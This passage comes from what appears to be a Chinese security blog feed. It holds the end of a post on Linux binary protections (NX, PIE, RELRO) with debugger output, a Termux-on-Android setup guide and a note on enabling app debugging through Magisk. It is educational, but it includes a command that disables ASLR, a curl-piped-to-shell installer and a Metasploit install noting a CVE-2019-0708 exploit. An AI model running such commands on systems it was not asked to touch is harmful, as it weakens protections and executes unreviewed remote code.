mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-execstack"><a href="#z-execstack" class="headerlink" title="-z execstack"></a><code>-z execstack</code></h2><p>开启栈可执行后，栈上的代码可被执行，同时其他处内存部分都是读写执行全开：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r-xp    /home/beale/Test_Dir/main0x00601000         0x00602000         rwxp    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rwxp    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rwxp    mapped0x00007ffffffde000 0x00007ffffffff000 rwxp    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h1><p>一般情况下 NX 和地址空间分布随机化（ASLR）会同时工作。<a href="https://blog.csdn.net/spenghui/article/details/79910884" target="_blank" rel="noopener">ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责；但是只有在开启 ASLR 之后，PIE 才会生效。</a>内存地址随机化机制（Address Space Layout Randomization)，有以下三种情况（具体的 ASLR 和 PIE 的互相作用：<a href="https://www.cnblogs.com/rec0rd/p/7646857.html）：" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html）：</a></p><ol><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将 mmap 的基址，stack 和 Vdso 页面随机化。</li><li>2 - 表示在 1 的基础上增加 heap 的随机化。</li></ol><p>可以防范基于 ret2libc 方式的针对 DEP 的攻击。ASLR 和 DEP 配合使用，能有效阻止攻击者在堆栈上运行恶意代码。位置独立的可执行区域（Position-Independent Executables）使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（Return-Oriented Programming）方法变得难得多。</p><blockquote><p>Linux 关闭 PIE 的方法：</p><pre><code class="bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre></blockquote><h2 id="Default（-no-pie）"><a href="#Default（-no-pie）" class="headerlink" title="Default（-no-pie）"></a>Default（<code>-no-pie</code>）</h2><p>默认不开启。静态分析程序时所得到的地址都是运行时的真实地址，基地址为 0x400000：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    bf c4 05 40 00           mov    edi,0x4005c4  40052f:    e8 cc fe ff ff           call   400400 &lt;puts@plt&gt;  400534:    b8 00 00 00 00           mov    eax,0x0  400539:    5d                       pop    rbp  40053a:    c3                       ret</code></pre><p>与 gdb 调试的时候相同：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x400521 &lt;frame_dummy+33&gt;:    jmp    0x4004a0 &lt;register_tm_clones&gt;   0x400526 &lt;main&gt;:    push   rbp   0x400527 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x40052a &lt;main+4&gt;:    mov    edi,0x4005c4   0x40052f &lt;main+9&gt;:    call   0x400400 &lt;puts@plt&gt;   0x400534 &lt;main+14&gt;:    mov    eax,0x0   0x400539 &lt;main+19&gt;:    pop    rbp   0x40053a &lt;main+20&gt;:    ret</code></pre><h2 id="pie"><a href="#pie" class="headerlink" title="-pie"></a><code>-pie</code></h2><p><code>-fpie</code> 与 <code>-fPIE</code> 效果一样，用于编译；<code>-pie</code> 用于链接。开启 PIE 后的静态反编译结果没有基地址，每次运行时的基地址不同：</p><pre><code class="asm">0000000000000750 &lt;main&gt;: 750:    55                       push   rbp 751:    48 89 e5                 mov    rbp,rsp 754:    48 8d 3d 99 00 00 00     lea    rdi,[rip+0x99]        # 7f4 &lt;_IO_stdin_used+0x4&gt; 75b:    e8 90 fe ff ff           call   5f0 &lt;puts@plt&gt; 760:    b8 00 00 00 00           mov    eax,0x0 765:    5d                       pop    rbp 766:    c3                       ret</code></pre><p>gdb 调试时如下：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x55555555474b &lt;frame_dummy+43&gt;:    jmp    0x555555554690 &lt;register_tm_clones&gt;   0x555555554750 &lt;main&gt;:    push   rbp   0x555555554751 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x555555554754 &lt;main+4&gt;:    lea    rdi,[rip+0x99]        # 0x5555555547f4   0x55555555475b &lt;main+11&gt;:    call   0x5555555545f0 &lt;puts@plt&gt;   0x555555554760 &lt;main+16&gt;:    mov    eax,0x0   0x555555554765 &lt;main+21&gt;:    pop    rbp   0x555555554766 &lt;main+22&gt;:    ret[rip+0x99] : 0x5555555547f4 (&quot;Hello World&quot;)</code></pre><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>在 Linux 系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC、GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro（Read Only Relocation）的技术。大概实现就是由 linker 指定程序的一块经过 dynamic linker 处理过 relocation 之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。RELRO 为 Partial RELRO，说明对 GOT 表具有写权限。</p><h2 id="Default（-z-lazy）"><a href="#Default（-z-lazy）" class="headerlink" title="Default（-z lazy）"></a>Default（<code>-z lazy</code>）</h2><p>默认情况下对 GOT 表具有写权限。可以看到 <code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分是可写的：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.50000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-norelro"><a href="#z-norelro" class="headerlink" title="-z norelro"></a><code>-z norelro</code></h2><p>没有开启 RELRO 的情况：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabledassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE00000000006008a8 R_X86_64_GLOB_DAT  __gmon_start__00000000006008c8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.500000000006008d0 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-now"><a href="#z-now" class="headerlink" title="-z now"></a><code>-z now</code></h2><p>此时无法修改 GOT 表。<code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分只有读权限：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULLassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600fe8 R_X86_64_GLOB_DAT  puts@GLIBC_2.2.50000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.50000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li><li>Canary：<code>-fno-stack-protector</code> / <code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li><li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li><li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li></ul><p><img src="/pics/Linux下的各类程序保护机制/2.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.gandalf.site/2019/03/linux-pwn.html" target="_blank" rel="noopener">http://www.gandalf.site/2019/03/linux-pwn.html</a><br><a href="https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not" target="_blank" rel="noopener">https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not</a><br><a href="https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld" target="_blank" rel="noopener">https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-pie.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-pie.html</a><br><a href="http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/" target="_blank" rel="noopener">http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>使用Termux在Android上打造小型Linux服务器</title>
    <link href="blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-03-01T02:50:30.000Z</published>
    <updated>2020-03-20T02:27:41.193Z</updated>
    
    <content type="html"><![CDATA[<p>使用 Termux 可以在 Android 上获得极佳的终端体验。</p><a id="more"></a><p>一些基础按键就不记录了。然后在 Termux 上的包管理工具有 pkg 和 apt，和 Debian 的基本一样，对我们来说已经很熟悉了。下面只是做一些简短的记录，用于备份。</p><h1 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h1><p>在 Termux 手机界面上可以完美实现 oh-my-zsh 的 agnoster 主题，在 Github 上已经有人实现了对应的安装脚本：</p><pre><code class="bash">sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot;</code></pre><p>具体的安装过程也不列举了，装完后会让我们选主题和字体。成功之后根目录下会有一个 storage 目录，映射了手机系统上的一些文件夹，方便文件传输：</p><pre><code class="bash">$ ls -l storagetotal 24lrwxrwxrwx 1 u0_a146 u0_a146 26 Mar  1 12:45 dcim -&gt; /storage/emulated/0/DCIMlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 downloads -&gt; /storage/emulated/0/Downloadlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 movies -&gt; /storage/emulated/0/Movieslrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 music -&gt; /storage/emulated/0/Musiclrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 pictures -&gt; /storage/emulated/0/Pictureslrwxrwxrwx 1 u0_a146 u0_a146 22 Mar  1 12:45 shared -&gt; /storage/emulated/0</code></pre><p>同样，我们可以给 QQ 的文件传输整一个软链接：</p><pre><code class="bash">ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ</code></pre><p>如此一来，传输文件就方便了很多：</p><pre><code class="bash">$ ls -al...lrwxrwxrwx 1 u0_a146 u0_a146   70 Mar  1 16:05 QQ -&gt; /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv...</code></pre><p>还能修改启动时的问候语：</p><pre><code class="bash">cp $PREFIX/etc/motd $PREFIX/etc/motd.bakvim $PREFIX/etc/motd</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/1.png" srcset="/img/loading.gif" alt></p><h1 id="Change-apt-sources"><a href="#Change-apt-sources" class="headerlink" title="Change apt-sources"></a>Change apt-sources</h1><p>给 apt 换个清华源：</p><pre><code class="bash">export EDITOR=viapt edit-sources</code></pre><p>修改为以下内容：</p><pre><code class="txt"># The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</code></pre><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>接下来装个 SSH，用电脑连上更方便地进行后续的安装。</p><pre><code class="bash">apt updateapt upgradeapt install openssh</code></pre><p>将电脑的公钥 push 到手机上：</p><pre><code class="bash">adb push ~/.ssh/id_rsa.pub /sdcard/authorized_keys</code></pre><p>在 Termux 中把电脑公钥放在 <code>.ssh</code> 目录下，并设置 authorized_keys 文件为拥有者只读。最后启动服务：</p><pre><code class="bash">cd .sshmv /sdcard/authorized_keys .chmod 400 authorized_keyssshd</code></pre><p>在电脑上转发 adb 端口并连接：</p><pre><code class="bash">adb forward tcp:8022 tcp:8022ssh localhost -p 8022</code></pre><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>Python 必不可少。默认 Python 指 Python3，Python2 指 Python2：</p><pre><code class="bash">apt install python2apt install python # python3</code></pre><h1 id="IPython"><a href="#IPython" class="headerlink" title="IPython"></a>IPython</h1><p>IPython 的安装必须有 clang 的依赖，否则会报错：</p><pre><code class="bash">apt install clangpip install ipythonpip3.6 install ipython</code></pre><h1 id="tsu"><a href="#tsu" class="headerlink" title="tsu"></a>tsu</h1><p>用 tsu 替代 su 可以完美实现 root 转换：</p><pre><code class="bash">apt install tsu</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/2.png" srcset="/img/loading.gif" alt></p><h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>需要联（ke）网（xue）下载：</p><pre><code class="bash">apt install unstable-repoapt install metasploit</code></pre><p>输入 msfconsole 可以查看效果：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/3.png" srcset="/img/loading.gif" alt></p><p>这个版本也已经有 CVE-2019-0708 的 EXP 了：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/4.png" srcset="/img/loading.gif" alt></p><h1 id="Termux-API"><a href="#Termux-API" class="headerlink" title="Termux-API"></a>Termux-API</h1><p>其它很多软件像是 Nmap、SQLMap 等等，还有 Github 上的项目都基本和 Linux 中一模一样，可以用 apt 还有 pip 等管理器进行安装。下面记录一下 Termux-API 这一工具。首先要安装一下 <a href="https://play.google.com/store/apps/details?id=com.termux.api" target="_blank" rel="noopener">Termux:API</a> 这一 APP，然后用 apt 安装命令行：</p><pre><code class="bash">apt install termux-api</code></pre><p>获取电池信息：</p><pre><code class="bash">$ termux-battery-status{  &quot;health&quot;: &quot;GOOD&quot;,  &quot;percentage&quot;: 100,  &quot;plugged&quot;: &quot;PLUGGED_USB&quot;,  &quot;status&quot;: &quot;FULL&quot;,  &quot;temperature&quot;: 22.700000762939453,  &quot;current&quot;: -38757}</code></pre><p>获取相机信息：</p><pre><code class="bash">$ termux-camera-info</code></pre><p>获取与设置剪切板：</p><pre><code class="bash">$ termux-clipboard-set thisisassassinq$ termux-clipboard-getthisisassassinq</code></pre><p>获取通讯录列表：</p><pre><code class="bash">$ termux-contact-list</code></pre><p>拨打电话：</p><pre><code class="bash">$ termux-telephony-call 10001</code></pre><p>获取当前 Wi-Fi 连接信息：</p><pre><code class="bash">$ termux-wifi-connectioninfo{  &quot;bssid&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;frequency_mhz&quot;: 2412,  &quot;ip&quot;: &quot;192.168.101.68&quot;,  &quot;link_speed_mbps&quot;: 144,  &quot;mac_address&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;network_id&quot;: 0,  &quot;rssi&quot;: -53,  &quot;ssid&quot;: &quot;&lt;unknown ssid&gt;&quot;,  &quot;ssid_hidden&quot;: true,  &quot;supplicant_state&quot;: &quot;COMPLETED&quot;}</code></pre><p>获取最近一次 Wi-Fi 扫描信息：</p><pre><code class="bash">$ termux-wifi-scaninfo</code></pre><h1 id="nyancat"><a href="#nyancat" class="headerlink" title="nyancat"></a>nyancat</h1><p>彩虹猫是在 2011 年 4 月上传在 YouTube 的视频，并且迅速爆红于网络，并在 2011 年 YouTube 浏览量最高的视频中排名第五。这个视频内容为一只卡通的猫咪飞翔在宇宙中，身后拖出一条彩虹，并且配上了 UTAU 虚拟歌手桃音モモ所演唱的背景音乐。终端版本下载：</p><pre><code class="bash">apt install nyancat</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/5.png" srcset="/img/loading.gif" alt></p><h1 id="终端二维码"><a href="#终端二维码" class="headerlink" title="终端二维码"></a>终端二维码</h1><p>生成终端二维码（字体没选好，效果不太好）：</p><pre><code class="bash">echo &quot;https://qianfei11.github.io&quot; | curl -F-=\&lt;- qrenco.de</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/6.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mushuichuan.com/2017/12/10/termux/" target="_blank" rel="noopener">https://mushuichuan.com/2017/12/10/termux/</a><br><a href="http://blackwolfsec.cc/2016/12/10/termux/" target="_blank" rel="noopener">http://blackwolfsec.cc/2016/12/10/termux/</a><br><a href="https://www.sqlsec.com/2018/05/termux.html" target="_blank" rel="noopener">https://www.sqlsec.com/2018/05/termux.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 Termux 可以在 Android 上获得极佳的终端体验。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>不同版本Android动态调试前打开调试开关简述</title>
    <link href="blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/"/>
    <id>blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/</id>
    <published>2020-02-29T02:13:37.000Z</published>
    <updated>2020-03-25T13:00:13.401Z</updated>
    
    <content type="html"><![CDATA[<p>手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>众所周知，最常规的方法就是在 AndroidManifest.xml 中的 application 标签中添加 <code>android:debuggable=&quot;true&quot;</code> 字段，然后再回编译、签名、安装、然后进行动态调试。但这种方法实在太麻烦了。</p><p>网上还有另外一种修改 Android prop 的工具 <a href="https://github.com/wpvsyou/mprop" target="_blank" rel="noopener">mprop</a>，用来修改 <code>default.prop</code> 中的 <code>ro.debuggable</code> 字段为 1（默认为 0）。因为 Android 系统初始化时，init 进程会解析系统属性文件，然后将其保存到内存中去，以便给所有应用提供服务（这种方法可以直接调试所有应用），所以在 init 进程的内存块中是存在这些属性的。在修改完成后要重启 adbd 进程，但这种方法的缺点是在每次开关机后需要重新修改。</p><p>最好的方法是能够直接安装一个程序，能够直接开启所有程序的调试，并且在开关机后也不需要重新设置。</p><h1 id="Android-4"><a href="#Android-4" class="headerlink" title="Android 4"></a>Android 4</h1><p>设备：Nexus 5</p><p>开启动态调试的要求是已 root，并且安装了 Xposed 框架。</p><h2 id="BDOpener"><a href="#BDOpener" class="headerlink" title="BDOpener"></a>BDOpener</h2><p><a href="https://github.com/riusksk/BDOpener" target="_blank" rel="noopener">BDOpener 下载链接</a></p><p>这里使用的是 BDOpener，这是一款 Xposed 的模块，用于修改程序的 debugable 选项，同时也支持开启备份选项，方便数据转移。只需要安装程序后，启用并重启手机，就能调试，可以用 monitor 来查看效果。</p><p><img src="/pics/不同版本Android动态调试前打开调试开关简述/1.png" srcset="/img/loading.gif" alt></p><h1 id="Android-9"><a href="#Android-9" class="headerlink" title="Android 9"></a>Android 9</h1><p>设备：Pixel XL</p><p>开启动态调试的要求是安装了 Magisk 框架（安装后默认 root）。因为 Xposed 的作者在 Android 6 后没有再更新，后来 Android 7 只出了非官方版本，尝试采用了 Magisk+Taichi 的方式来使用上面的 Xposed 模块，但安装了之后发现 Android UI 会在开机之后崩溃，所以尝试了另外一种方法。</p><h2 id="MagiskHidePropsConf"><a href="#MagiskHidePropsConf" class="headerlink" title="MagiskHidePropsConf"></a><a href="https://forum.xda-developers.com/apps/magisk/module-magiskhide-props-config-t3789228" target="_blank" rel="noopener">MagiskHidePropsConf</a></h2><p><a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf" target="_blank" rel="noopener">MagiskHidePropsConf 下载链接</a></p><p><a href="https://github.com/osm0sis/android-busybox-ndk" target="_blank" rel="noopener">Busybox 下载链接</a></p><p>MagiskHidePropsConf 是 Magisk 下的一个模块，可以用来修改系统中内存里的 props 值，并且永久生效，那么就可以用来修改 <code>ro.debuggable</code> 字段了。同时要求安装 Busybox for Android NDK 才能运行。操作如下：</p><pre><code class="sh">marlin:/ # propsLoading... Please wait.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Updating fingerprints list=====================================Checking connection.No connection.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Select an option below.=====================================1 - Edit device fingerprint2 - Device simulation (disabled)3 - Edit MagiskHide props4 - Add/edit custom props5 - Delete prop values6 - Script settings7 - Collect logsr - Reset all options/settingsb - Reboot devicee - ExitSee the module readme or thesupport thread @ XDA for details.Enter your desired option: 3MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== MagiskHide props (active) Select an option below:=====================================Change the sensitive props set by MagiskHide.1 - ro.debuggable2 - ro.secure3 - ro.build.type4 - ro.build.tags5 - ro.build.selinuxa - Change all propsb - Go back to main menue - ExitPick several options at once byseparating inputs with a comma.Example: 1,5,6See the module readme or thesupport thread @ XDA for details.Enter your desired option: 1MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== ro.debuggable=====================================Currently set to 0.You currently have the safe value set.Are you sure you want to change it to 1?Enter y(es), n(o) or e(xit): yMagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Reboot - ro.debuggable=====================================Reboot for changes to take effect.Do you want to reboot now (y/n)?Enter y(es), n(o) or e(xit): yRebooting...</code></pre><p>重启后也可以动态调了，同样可以用 monitor 来验证有没有成功。</p><h2 id="Magisk-命令"><a href="#Magisk-命令" class="headerlink" title="Magisk 命令"></a>Magisk 命令</h2><p>使用 Magisk 的命令也可以实现：</p><pre><code class="bash">magisk resetprop ro.debuggable 1stop; start; # 必须用这种方式重启</code></pre><p>在调试的过程中发现在 Pixel 下如果开了调试会出现开发者选项无法打开的问题，暂时没有解决方法。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" 